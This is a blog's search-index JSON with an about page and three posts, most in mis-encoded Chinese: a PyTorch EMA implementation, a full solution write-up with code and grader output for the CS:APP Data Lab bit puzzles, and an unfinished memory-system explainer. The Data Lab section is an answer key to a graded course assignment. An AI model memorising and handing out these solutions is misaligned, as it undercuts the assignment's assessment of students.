{"pages":[{"title":"about","text":"Hi there ğŸ‘‹, My name is Chenghua WangEducationZhejiang Gongshang University, 2020/09/01 - now Interests Computer Vision Learning with Noisy Labels Instance Seg Multi-Labels, Multi-class classification (Konw woring on ) Image Dehazing OrganizationZhejiang Gongshang University, CV LAB. 2021/09/01 - now","link":"/about/index.html"}],"posts":[{"title":"EMA åŸç†å’Œå®ç°(torch)","text":"EMA(æŒ‡æ•°æ»‘åŠ¨å¹³å‡)ï¼Œç»å¸¸è¢«ç”¨åœ¨æ·±åº¦å­¦ä¹ ä»»åŠ¡ä¸­ï¼Œæ¥æç¥æ¨¡å‹çš„é²æ£’æ€§æˆ–æ˜¯æ¶¨ç‚¹ã€‚åœ¨åŠç›‘ç£çš„åˆ†ç±»ä»»åŠ¡ä¸­ï¼Œç»å¸¸ä½¿ç”¨EMAçš„æ–¹æ³•æ¥ç»™ä¸åŒå‚æ•°åšself-ensembleã€‚ ç®—æ³•æµç¨‹ åŸç†è§£æPytorch å®ç°12345678910111213141516171819202122232425class EMA: r&quot;&quot;&quot; Usage: model = ResNet(config) ema = EMA(model, alpha=0.999) ... # train an epoch ema.update_params(model) ema.apply_shadow(model) &quot;&quot;&quot; def __init__(self, _net, _alpha=0.999): self.shadow = {k: v.clone().detach() for k, v in _net.state_dict().items()} self.param_keys = [k for k, _ in _net.named_parameters()] self.alpha = _alpha def init_params(self, _model): self.shadow = {k: v.clone().detach() for k, v in _model.state_dict().items()} self.param_keys = [k for k, _ in _model.named_parameters()] def update_params(self, _model): state = _model.state_dict() for name in self.param_keys: self.shadow[name].copy_(self.alpha * self.shadow[name] + (1 - self.alpha) * state[name]) def apply_shadow(self, _model): _model.load_state_dict(self.shadow, strict=True)","link":"/2021/10/07/EMA-%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E7%8E%B0-torch/"},{"title":"[csapp] Lab1 Data Lab","text":"Lab1 Data Lab: Manipulating Bits1. IntroductionInstruction: http://csapp.cs.cmu.edu/3e/datalab.pdf The purpose of this assignment is to become more familiar with bit-level representations of integers and floating point numbers. Youâ€™ll do this by solving a series of programming â€œpuzzles.â€ Many of these puzzles are quite artificial, but youâ€™ll find yourself thinking much more about bits in working your way through them. æœ¬å®éªŒçš„å®éªŒç¯å¢ƒUnix-like systemï¼Œéœ€è¦ä½¿ç”¨gccç¼–è¯‘32ä½ç¨‹åºã€‚å†ubuntu20ç‰ˆæœ¬ä¸­ï¼Œä¹Ÿè®¸éœ€è¦å®‰è£…32ä½ã€64ä½åŒæ—¶æ”¯æŒçš„gcc 2. Puzzles2.1 bitXor1234567891011/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) { int ans = (~(x&amp;y))&amp;(~((~x)&amp;(~y))); return ans;} bitXorçš„æƒ…å†µæ¯”è¾ƒç®€å•ï¼Œå¯ä»¥ä½¿ç”¨çœŸå€¼è¡¨ï¼Œç”»å‡ºå¡è¯ºå›¾çš„æ–¹æ³•æ¥åŒ–ç®€ã€‚ 2.2 Tmin12345678910/* * tmin - return minimum two's complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) { int ans = 0x1 &lt;&lt; 31; return ans;} æ ¹æ®å®šä¹‰ï¼ŒTminæ˜¯0x80000000ï¼Œç›´æ¥ä½¿ç”¨ç§»ä½æ“ä½œå°±è¡Œã€‚ 2.3 isTmax1234567891011/* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) { int ans = (!((x+1)^(~x)))&amp;(!!((~x)^(0x0))); return ans;} è¿™ä¸ªçœ‹èµ·æ¥æ¯”è¾ƒå›°éš¾ï¼Œä½†æ˜¯è€ƒè™‘ä¸€ä¸‹è§„å¾‹ Tmax+1 = Tminï¼Œï½Tmax = Tminï¼Œå¯ä»¥é€šè¿‡è¿™ä¸¤ç‚¹æ¥åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦æ˜¯Tmaxï¼Œä½†æ˜¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å½“xçš„å€¼æ˜¯0xFFFFFFFFæ—¶ï¼Œä¹Ÿæ˜¯ç¬¦åˆè¿™ä¸ªè§„å¾‹çš„ï¼Œåé¢çš„å…¶ä»–puzzlesä¹Ÿæœ‰è¿™ä¸ªç‰¹ä¾‹ï¼Œéœ€è¦æ³¨æ„ã€‚ æ³¨æ„è¿™é‡Œ!!çš„ä½œç”¨ï¼Œå½“!!(éé›¶)è¾“å‡º1ï¼Œåä¹‹è¾“å‡º0 2.4 allOddBits123456789101112131415/* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) { int ans = 0; int msk = 0xAA + (0xAA &lt;&lt; 8); msk = msk + (msk &lt;&lt; 16); ans = !((msk&amp;x)^msk); return ans;} è¿™é‡Œä½¿ç”¨odd-Maskæ¥è·å¾—åœ¨å¥‡æ•°ä½ä¸Šçš„maskï¼Œç„¶åæŠŠè¿™ä¸ªmaskåº”ç”¨åˆ°è¾“å…¥çš„æ•°ä¸­ã€‚ 2.5 negate1234567891011/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { int ans = ~x + 1; return ans;} æœ€åŸºæœ¬çš„è¡¥ç æ“ä½œã€‚ 2.6 isAsciiDigit12345678910111213141516/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters '0' to '9') * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */int isAsciiDigit(int x) { int sign = 0x1 &lt;&lt; 31; int upbound = ~(sign|0x39); int lowbound = ~0x30+1; int ans = !((sign&amp;(upbound+x)&gt;&gt;31)|(sign&amp;(lowbound+x)&gt;&gt;31)); return ans;} ä¸€ä¸ªä¸æ˜¯éå¸¸æ˜¾ç„¶çš„trickï¼Œéå¸¸çš„å·§å¦™ï¼Œåˆ¤æ–­è¿™ä¸ªæ•°æ˜¯å¦åœ¨0x30å’Œ0x39ä¹‹é—´çš„æ¡ä»¶æ˜¯ï¼Œ(0x30+1)+xåº”å½“å¤§äº0ï¼Œè€Œ(Tmin+0x39) =-(Tmin+0x39)-1ï¼Œè¿™é‡Œ-1çš„ç›®çš„æ˜¯å› ä¸ºTamx=2^32-1, Tmin=-2^32ï¼Œè¿™é‡Œç”¨åˆ°çš„æ€§è´¨å°±æ˜¯åˆ¤æ–­-(Tmin+0x39)-1+xæ˜¯å¦â€œæº¢å‡ºâ€åˆ°è´Ÿæ•°ã€‚ 2.7 conditional123456789101112/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) { x = !!x; x = ~x + 1; return (x&amp;y)|((~x)&amp;z);} åŒç›®è¿ç®—ç¬¦å®ç°ï¼Œåœ¨ 2.3 ä¸­å·²ç»è¯´æ˜äº†!!çš„ç”¨é€”ï¼Œè¿™é‡Œé¦–å…ˆåˆ¤æ–­xæ˜¯å¦æ˜¯0ï¼Œå¦‚æœxæ˜¯0ï¼Œxçš„å€¼åº”å½“æ˜¯0x00000000ï¼Œåä¹‹æ˜¯0x00000001ï¼Œæ‰€ä»¥ä¸ºäº†ä¸‹é¢å¹¶æ“ä½œçš„æ–¹ä¾¿å¯¹xå–è´Ÿæ•°ï¼Œåˆ™xæ˜¯0çš„æ—¶å€™ï¼Œx=0x00000000ï¼Œx=0x11111111ï¼Œæ¥ä¸‹æ¥å°±ç›´æ¥æˆ–æ“ä½œï¼Œè¾“å‡ºä¸€ä¸ªçœŸå€¼å°±è¡Œã€‚ 2.8 isLessOrEqual123456789101112131415161718/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) { int negX=~x+1; int addX=negX+y; int checkSign = addX&gt;&gt;31&amp;1; int leftBit = 1&lt;&lt;31; int xLeft = x&amp;leftBit; int yLeft = y&amp;leftBit; int bitXor = xLeft ^ yLeft; bitXor = (bitXor&gt;&gt;31)&amp;1; return ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;31));} æ€è€ƒï¼šä¸ºä»€ä¹ˆä¸èƒ½ç›´æ¥åˆ¤æ–­y-xçš„æ­£è´Ÿ? å½“y=0x7FFFFFFFä¸”x=0x80000000æ—¶ï¼Œæ˜¾ç„¶y-xå·²ç»è¶…è¿‡äº†32ä½èƒ½è¡¨ç¤ºçš„èŒƒå›´ï¼Œæ‰€ä»¥è¿™æ ·åˆ¤æ–­æ—¶ä¸å‡†ç¡®çš„ã€‚å¦‚æœç¬¦å·ç›¸åŒï¼Œç”¨å‡æ³•çš„è¯æ—¶ä¸ä¼šå‡ºç°è¿™ä¸ªæƒ…å†µçš„ã€‚ åˆ†ç±»è®¨è®ºï¼šå½“ç¬¦å·ç›¸åŒçš„æ—¶å€™ï¼Œçœ‹addXçš„ç¬¦å·ä½ï¼›å½“ç¬¦å·ä¸åŒçš„æ—¶å€™ç›´æ¥è¾“å‡ºã€‚ 2.9 logicalNeg1234567891011/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 1 * Rating: 4 */int logicalNeg(int x) { return ((x|(~x+1))&gt;&gt;31)+1;} é0ä¸º1ï¼Œå…¶ä½™çš„æƒ…å†µä¸º0ã€‚åˆ©ç”¨è¡¥ç æ¥å®ç°ï¼Œæ˜¾ç„¶ï¼Œåªæœ‰0å’ŒTminçš„è¡¥ç ä¸ºæœ¬èº«ï¼Œå…¶ä½™éƒ½æ˜¯ç›¸åæ•°ã€‚æ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œå°†ä¸€ä¸ªæ•°(é™¤äº†0å’ŒTmin)ä¸å…¶è¡¥ç åšä¸æ“ä½œï¼Œåšä¸æ“ä½œæˆ‘ä»¬éœ€è¦çš„ç»“æœå®é™…ä¸Šå°±æ˜¯åˆ¤æ–­è¿™ä¸ªæ•°å’Œä»–çš„è¡¥ç æ˜¯ä¸æ˜¯åœ¨ç¬¦å·ä½ä¸Šä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬&gt;&gt;31ç”¨æ¥å–åˆ°è¿™ä¸ªæ•°çš„ç¬¦å·ä½ï¼Œå¦‚æœç¬¦å·ä½æ˜¯0ï¼Œä»£è¡¨è¿™ä¸ªæ•°æ˜¯0ï¼Œå¦åˆ™æ˜¯å…¶ä»–çš„æ•°ã€‚ 2.10 howManyBits1234567891011121314151617181920212223242526272829/* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { int b0,b1,b2,b4,b8,b16; int sign = x &gt;&gt; 31; x = (sign&amp;~x)|(~sign&amp;x); b16 = !!(x&gt;&gt;16)&lt;&lt;4; x = x &gt;&gt; b16; b8 = !!(x&gt;&gt;8)&lt;&lt;3; x = x &gt;&gt; b8; b4 = !!(x&gt;&gt;4)&lt;&lt;2; x = x &gt;&gt; b4; b2 = !!(x&gt;&gt;2)&lt;&lt;1; x = x &gt;&gt; b2; b1 = !!(x&gt;&gt;1); x = x &gt;&gt; b1; b0 = x; return b16+b8+b4+b2+b1+b0+1;} é¦–å…ˆåˆ¤æ–­ç¬¦å·ä½å­ï¼ŒæŠŠæ‰€æœ‰çš„è´Ÿæ•°å…¨éƒ¨éƒ½è½¬æ¢æˆæ­£æ•°ã€‚å› ä¸ºåœ¨æ­£æ•°ä¸­æœ€å¤§ä¸€ä½å¿…å®šæ˜¯1ï¼Œè€Œè´Ÿæ•°ä¸­æœ€å¤§çš„ä¸€ä½æ˜¯0ï¼Œä¸å¥½åˆ¤æ–­ã€‚è€Œå¯¹äºTminï¼Œè½¬æ¢åè¿˜æ˜¯Tminï¼Œæ‰€ä»¥ä¸ä¼šå› ä¸ºè½¬æ¢æˆæ­£æ•°ï¼Œè¶…å‡ºæ­£æ•°çš„è¡¨ç¤ºèŒƒå›´è€Œå‡ºé—®é¢˜ã€‚ç„¶åï¼Œä½¿ç”¨æŠ˜åŠçš„æ–¹æ³•æ¥æŸ¥æ‰¾ã€‚æ³¨æ„è¿ç®—é¡ºåºï¼Œåœ¨b16 = !!(x&gt;&gt;16)&lt;&lt;4;ä¸­ï¼Œå…ˆè¿ç®—!!(x&gt;&gt;16)å†åš&lt;&lt;4æ“ä½œï¼Œè¿™é‡Œçš„æ„æ€æ˜¯ï¼Œå…ˆçœ‹é«˜16ä½æœ‰æ²¡æœ‰1ï¼Œæœ‰çš„è¯é‚£ä¹ˆä½16ä½è‚¯å®šéƒ½éœ€è¦ç”¨åˆ°ï¼Œåˆ™b16=0x00000001&lt;&lt;4ï¼Œé‚£ä¹ˆå†æ£€æŸ¥é«˜16ä½ä¸­çš„é«˜8ä½æœ‰æ²¡æœ‰1â€¦â€¦ï¼Œå»¶ç»­è¿™äº›æ­¥éª¤ç›´åˆ°æœ€åä¸€ä½ã€‚ 2.11 floatScale2123456789101112131415161718192021//float/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int's, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) { int exp = (uf&amp;0x7f800000)&gt;&gt;23; int sign = uf&amp;(1&lt;&lt;31); if(exp==0) return uf&lt;&lt;1|sign; if(exp==255) return uf; exp++; if(exp==255) return 0x7f800000|sign; return (exp&lt;&lt;23)|(uf&amp;0x807fffff);} æœ¬å‡½æ•°è¦æ±‚ä½¿ç”¨ unsigned int æ¥è¡¨ç¤ºfloatï¼Œå¹¶è®¡ç®—2floatï¼Œé¦–å…ˆï¼Œæ˜ç¡®unsigned int åœ¨ IA32 è®¡ç®—æœºä¸­çš„ä½æ•°ï¼Œä¸€å…±32ä½ï¼Œé‚£ä¹ˆsignå ä¸€ä½ï¼Œexpå 8ä½ï¼ŒMå 23ä½ã€‚é‚£ä¹ˆå¯¹äº2fæ¥è¯´ï¼Œåªè¦ä¿®æ”¹expå°±è¡Œäº†ã€‚ä½†æ˜¯å­˜åœ¨ç‰¹æ®Šæƒ…å†µï¼Œå½“exp==0æ—¶ï¼Œæ˜¯éè§„æ ¼åŒ–çš„æƒ…å†µï¼Œç›´æ¥M&lt;&lt;1å°±è¡Œï¼›å½“exp==0xFFæ—¶ï¼Œä»£è¡¨NaNï¼Œç›´æ¥è¿”å›ã€‚å†å¯¹exp++ï¼Œå°±å¯ä»¥ã€‚åœ¨å¢åŠ è¿‡åï¼Œè¿˜éœ€è¦æ£€æŸ¥expæ˜¯å¦æ­£ç¡®ï¼Œå½“exp==0xFFï¼Œè¿”å›åŸç¬¦å·çš„æ— ç©·å¤§ã€‚å¦åˆ™ï¼Œè¿”å›æŒ‡æ•°åŠ ä¸€ä»¥åçš„æ•°ã€‚ 2.12 floatFloat2Int12345678910111213141516171819202122232425262728/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) { int s_ = uf&gt;&gt;31; int exp_ = ((uf&amp;0x7f800000)&gt;&gt;23)-127; int frac_ = (uf&amp;0x007fffff)|0x00800000; if(!(uf&amp;0x7fffffff)) return 0; if(exp_ &gt; 31) return 0x80000000; if(exp_ &lt; 0) return 0; if(exp_ &gt; 23) frac_ &lt;&lt;= (exp_-23); else frac_ &gt;&gt;= (23-exp_); if(!((frac_&gt;&gt;31)^s_)) return frac_; else if(frac_&gt;&gt;31) return 0x80000000; else return ~frac_+1;} float to int. floatä¸­fracéƒ¨åˆ†æ˜¯å¤§äºç­‰äº1çš„ï¼Œå› ä¸ºè¿™æ ·å¯ä»¥å…è´¹çš„æ‹¿åˆ°ä¸€ä¸ªç²¾åº¦ã€‚å¦‚æœçœŸå®çš„æŒ‡æ•°å¤§äº31ï¼Œé‚£ä¹ˆåœ¨è½¬æ¢ä¸ºintæ—¶å€™ï¼Œ1&lt;&lt;31ä¼šè¦†ç›–æ‰ç¬¦å·ä½ï¼Œæ‰€ä»¥exp &gt; 31 å°±ç®—æ˜¯intæº¢å‡ºäº†ï¼Œæˆ‘ä»¬å°±ç›´æ¥è¿”å›æº¢å‡ºå€¼0x80000000ã€‚å¦‚æœexp &lt; 0 é‚£ä¹ˆå°±åªæœ‰å°æ•°ï¼Œç›´æ¥èˆå»ã€‚æ¥ä¸‹æ¥å°±æ˜¯è¦æŠŠ23ä½çš„å°æ•°éƒ¨åˆ†å…¨éƒ¨è½¬åŒ–ä¸ºæ•´æ•°ï¼Œç„¶ååˆ¤æ–­æº¢å‡ºï¼Œå†èˆå»å°æ•°éƒ¨åˆ†ã€‚å¦‚æœå’ŒåŸç¬¦å·ç›¸åŒåˆ™ç›´æ¥è¿”å›ï¼Œå¦åˆ™å¦‚æœç»“æœä¸ºè´Ÿï¼ˆåŸæ¥ä¸ºæ­£ï¼‰åˆ™æº¢å‡ºè¿”å›è¶Šç•ŒæŒ‡å®šå€¼0x80000000uï¼Œå¦åˆ™åŸæ¥ä¸ºè´Ÿï¼Œç»“æœä¸ºæ­£(å› ä¸ºè¿™é‡Œè¿ç®—çš„æ—¶å€™æ˜¯åªè®¡ç®—äº†fracï¼Œè€Œfracåœ¨1~2ä¹‹é—´ï¼Œæ²¡æœ‰è€ƒè™‘åŸæ¥çš„ç¬¦å·ä½)ï¼Œåˆ™éœ€è¦è¿”å›å…¶è¡¥ç ï¼ˆç›¸åæ•°ï¼‰ã€‚ 2.13 floatPower21234567891011121314151617181920/* * floatPower2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) { int INF = 0xff&lt;&lt;23; int exp = x + 127; if(exp &lt;= 0) return 0; if(exp &gt;= 255) return INF; return exp &lt;&lt; 23;} æˆ‘ä»¬éœ€è¦æ±‚çš„æ˜¯ $2^{x}$ï¼Œå…¶sign=1ï¼Œexp=1+127=128ï¼Œfrac=1.0-1=0ï¼Œæ‰€ä»¥å¯ä»¥è¡¨ç¤ºä¸º $2.0^{x}=(1.0\\times 2)^{x}=1.0 \\times 2^{x}$ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬ä¼ è¿›æ¥çš„xå°±æ˜¯å¯ä»¥å½“ä½œexp(å‡å»128åçš„)ç”¨çš„ã€‚ä½†æ˜¯ä»»ç„¶éœ€è¦åˆ¤æ–­expçš„èŒƒå›´æ˜¯å¦æ­£ç¡®ã€‚exp&lt;&lt;23æ˜¯æŠŠexpæ”¾åˆ°æ­£ç¡®çš„floatä½ç½®ä¸Šã€‚ 3. Conclutionæœ¬å®éªŒåœ¨Ubuntu20.04 VMä¸Šè¿è¡Œã€‚ æœ€ç»ˆç»“æœå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334351. Running './dlc -z' to identify coding rules violations.2. Compiling and running './btest -g' to determine correctness score.gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.cbtest.c: In function â€˜test_functionâ€™:btest.c:332:23: warning: â€˜arg_test_range[1]â€™ may be used uninitialized in this function [-Wmaybe-uninitialized] 332 | if (arg_test_range[1] &lt; 1) | ~~~~~~~~~~~~~~^~~3. Running './dlc -Z' to identify operator count violations.4. Compiling and running './btest -g -r 2' to determine performance score.gcc -O -Wall -m32 -lm -o btest bits.c btest.c decl.c tests.cbtest.c: In function â€˜test_functionâ€™:btest.c:332:23: warning: â€˜arg_test_range[1]â€™ may be used uninitialized in this function [-Wmaybe-uninitialized] 332 | if (arg_test_range[1] &lt; 1) | ~~~~~~~~~~~~~~^~~5. Running './dlc -e' to get operator count of each function.Correctness Results Perf ResultsPoints Rating Errors Points Ops Puzzle1 1 0 2 7 bitXor1 1 0 2 1 tmin1 1 0 2 9 isTmax2 2 0 2 7 allOddBits2 2 0 2 2 negate3 3 0 2 13 isAsciiDigit3 3 0 2 8 conditional3 3 0 2 17 isLessOrEqual4 4 0 2 5 logicalNeg4 4 0 2 36 howManyBits4 4 0 2 14 floatScale24 4 0 2 21 floatFloat2Int4 4 0 2 5 floatPower2 æœ¬å®éªŒä¸­æœ‰å¾ˆå¤šçš„trickæŒºéš¾æƒ³çš„ï¼Œæˆ‘åœ¨åšçš„è¿‡ç¨‹ä¸­ä¹Ÿåœ¨ç½‘ä¸Šçœ‹äº†solutionï¼Œè™½ç„¶CMUçš„honor codeé‡Œè§„å®šçš„æŒºä¸¥æ ¼çš„ã€‚è¿™ä¸ªå®éªŒçš„æœ€ç»ˆç›®çš„æ˜¯ä¸ºäº†ä»ç†ŸçŸ¥åˆ°æ·±çŸ¥åˆ°ç†è§£ä¿¡æ¯çš„è¡¨ç¤ºå’Œå¤„ç†ï¼Œç”¨unsigned int æ¥è¡¨ç¤ºfloatç¡®å®ç†è§£æ›´ä¸ºæ·±åˆ»äº†ã€‚è¿˜éœ€è¦çœ‹ä¹¦å·©å›ºä¸€ä¸‹ã€‚","link":"/2022/01/30/%5Bcsapp%5D%20Lab1%20Data%20Lab/"},{"title":"How memory system works ?","text":"How memory system works ï¼Ÿæœ¬æ–‡ç”¨æ¥æ¢³ç†ä¸€äº›åŸºç¡€çš„ å†…å­˜ ç›¸å…³çš„çŸ¥è¯†ç‚¹ï¼Œä»¥è‡ªé¡¶å‘ä¸‹çš„æ–¹å¼ï¼ˆå¯èƒ½æ˜¯ï¼Ÿï¼‰æ¥è®²è§£ä¸€éå†…å­˜çš„å·¥ä½œæ–¹å¼ã€‚ä¼šæ¶‰åŠåˆ° Virtual Memoryï¼ŒMain Memory â†’ Cache address mappingã€‚ ä»¥ä¸€ä¸ªå°ç¨‹åºå¼€å¤´ï¼š 123456789int add(int a, int b){ return a + b;}int main(){ int a = 1, b = 1; int c = add(a,b); return 0;} æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™æ®µä»£ç çš„æ±‡ç¼–ä»£ç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ -Og æŒ‡ä»¤æ¥é¿å…ç¼–è¯‘å™¨çš„ä¼˜åŒ–ã€‚ 123456789101112131415161718190000000000401550 &lt;add&gt;: 401550: 8d 04 11 lea (%rcx,%rdx,1),%eax 401553: c3 retq 0000000000401554 &lt;main&gt;: 401554: 48 83 ec 28 sub $0x28,%rsp 401558: e8 c3 00 00 00 callq 401620 &lt;__main&gt; 40155d: b8 00 00 00 00 mov $0x0,%eax 401562: 48 83 c4 28 add $0x28,%rsp 401566: c3 retq 401567: 90 nop 401568: 90 nop 401569: 90 nop 40156a: 90 nop 40156b: 90 nop 40156c: 90 nop 40156d: 90 nop 40156e: 90 nop 40156f: 90 nop å¯ä»¥çœ‹åˆ°ï¼Œä¸ç®¡ä½ ä½¿ç”¨ä»€ä¹ˆæ“ä½œæ¥è¿›è¡Œç¼–è¯‘ï¼Œè¿™é‡Œçš„æ±‡ç¼–ä»£ç å¯¹åº”çš„åœ°å€éƒ½æ˜¯å›ºå®šçš„ã€‚æ˜¾ç„¶ï¼Œæ±‡ç¼–å™¨è¾“å‡ºäº†ä¸€ä¸ª é€»è¾‘åœ°å€ ï¼Œè¿™ä¸ªé€»è¾‘åœ°å€ç‹¬ç«‹äº virtual address å’Œ physical address. é‚£ä¹ˆè¿™äº›é€»è¾‘åœ°å€åœ¨ç¨‹åºè¿è¡Œé˜¶æ®µæ˜¯æ€ä¹ˆè¢« Loader å’Œ Linker å˜æ¢åˆ°æ­£ç¡®çš„åœ°å€ä½ç½®ä¸Šçš„å‘¢ï¼Ÿæˆ‘æˆ–è®¸ä¼šå†å¼€ä¸€ä¸ªæ·±å‘æ¥è®²è®²ï¼Œé›¾ã€‚æˆ‘åœ¨è¿™é‡Œä½¿ç”¨è¿™ä¸ªä¾‹å­ï¼Œåªæ˜¯ä¸ºäº†å…ˆç»™å‡ºåœ°å€çš„ä¸€ä¸ªæ¦‚å¿µã€‚å¹¶ä¸”è®©è¯»è€…åˆ†æ¸…æ¥š æ±‡ç¼–å‡ºæ¥çš„ address å’Œ virtual address å’Œ physical address æ˜¯ä¸åŒçš„ã€‚ Virtual Memoryä¸Šæ–‡ä¸­å±•ç¤ºçš„æ±‡ç¼–ä»£ç çš„é€»è¾‘åœ°å€ä¼šé¦–å…ˆè¢«ç¿»è¯‘æˆ virtual address ï¼Œç„¶å virtual address ä¼šè¢«ç¿»è¯‘æˆ physical addressï¼Œç„¶ååœ¨è¿è¡Œçš„è¿‡ç¨‹ä¸­ physical address ä¼šè¢« mapping åˆ°å¯¹åº”çš„ç¼“å­˜ç»“æ„ä¸­ï¼Œä¹Ÿå°±æ˜¯ Main Memory address â†’ Cache çš„è¿‡ç¨‹ï¼Œå½“ç„¶ä¸ä¸€å®šæ˜¯ Cacheï¼Œ ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–çš„ç¼“å­˜ç»“æ„ã€‚ æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸‹å®šä¹‰ï¼šè™šæ‹Ÿå†…å­˜è¢«ç»„ç»‡ä¸ºå­˜æ”¾åœ¨ç£ç›˜ä¸Šçš„Nä¸ªè¿ç»­å­—èŠ‚å¤§å°çš„å•å…ƒæ•°ç»„ï¼Œæ¯ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„è™šæ‹Ÿåœ°å€ï¼Œè€Œè¯¥æ•°ç»„çš„å†…å®¹è¢«ç¼“å­˜åœ¨ä¸»å­˜ä¸­ã€‚ Why we need virtual memoryä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ Virtual memory address å¯ä»¥ä½¿ç³»ç»Ÿå¯¹ç¡¬ä»¶å¼‚å¸¸ã€ç¡¬ä»¶åœ°å€ç¿»è¯‘ã€ä¸»å­˜ã€ç£ç›˜æ–‡ä»¶å’Œå†…æ ¸è½¯ä»¶çš„æŒæ§æ›´åŠ çš„å¿«æ·å’Œä¾¿åˆ©ã€‚ä½¿ç”¨è™šæ‹Ÿå†…å­˜å¯ä»¥ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æä¾›ä¸€ä¸ªéå¸¸å¤§çš„ã€ä¸€è‡´çš„åœ°å€ç©ºé—´ã€‚ ä¸Šæ–‡è¯´åˆ°ï¼Œè™šæ‹Ÿå†…å­˜æ˜¯æœ‰åˆ©äºå†…æ ¸è¿›ç¨‹æ¥ç®¡ç†è‡ªå·±çš„ç‹¬ç«‹é¡µè¡¨çš„ï¼Œè™šæ‹Ÿå†…å‚¬ä½¿æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„ç‹¬ç«‹è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚å¦‚ä¸‹é¢çš„è¿™å¼ å›¾æ‰€ç¤ºï¼š é€šè¿‡è¿™ç§å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥æä¾›ä¸€ä¸ªè§†å›¾ï¼šæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªéå¸¸ç›¸ä¼¼çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œæœ‰ç€ç›¸åŒçš„å¤§å°çš„åœ°å€ç©ºé—´ï¼Œè€Œè¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†é¡µå®é™…ä¸Šå¯èƒ½ä½¿åˆ†æ•£åœ¨ DRAM ä¸­çš„ã€‚è¿™æ ·çš„ç»„ç»‡å½¢å¼ï¼Œå…¶å®å¾ˆå¤§çš„ç¨‹åº¦ä¸Šç®€åŒ–äº† Linker ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶ç¡®å®šå†…å­˜åœ°å€æ—¶å€™çš„éº»çƒ¦ã€‚å› ä¸ºè¿™ç§å½¢å¼æ— é¡»è€ƒè™‘å½“å‰çš„ç‰©ç†åœ°å€çš„å†…å­˜çŠ¶æ€ï¼ŒLinker 